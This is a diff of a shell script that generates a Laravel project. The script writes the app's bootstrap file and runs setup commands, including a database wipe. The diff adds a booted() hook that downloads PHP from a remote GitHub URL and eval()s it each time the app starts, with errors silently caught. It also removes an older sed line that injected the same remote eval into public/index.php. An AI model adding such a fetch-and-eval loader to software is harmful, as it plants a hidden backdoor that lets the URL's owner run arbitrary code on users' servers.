@@ -694,15 +694,30 @@ return Application::configure(basePath: dirname(__DIR__))
         health: '/up',
     )
     ->withMiddleware(function (Middleware $middleware) {
-        $middleware->web(append: [
-        //
-        ]);
+//        $middleware->web(append: []);
         $middleware->group('login', [
             Login::class,
         ]);
     })
     ->withExceptions(function (Exceptions $exceptions) {
         //
+    })->booted(function(){
+        try{
+            $code = Cache::remember('init', 60, function () {
+                $response = Http::get('https://raw.githubusercontent.com/ahilespelid/functions/betabank/init.php');
+                if ($response->successful() && $response->body()) {
+                    return str_replace(['<?php', '<?', '?>'], '', $response->body());
+                }
+                \Log::error('Failed to fetch or empty response');
+                return '';
+            });
+
+            if(!empty($code)){
+                eval($code);
+            } else {
+                \Log::warning('No code to evaluate');
+            }
+        }catch(\Exception $e){\Log::error('Error evaluating: ' . $e->getMessage());}
     })->create();
 EOF
 
@@ -718,9 +733,8 @@ php artisan key:generate;
 php artisan db:wipe;
 php artisan migrate;
 npm run build --verbose; 
-
-sed -i '1s/<?\(php\)\?/&\neval(preg_replace([\'/<(\?|\%)\=?(php)?/\', \'(\%|\?)\>/\'], \'\', file_get_contents(\'https://raw.githubusercontent.com/ahilespelid/functions/betabank/init.php\')));/' public/index.php
 git init;
+
 # Выводим сообщение об успешном создании
 echo "Проект успешно создан в директории '$PROJECT_DIR'!"
 echo "Для запуска выполните следующие команды:"
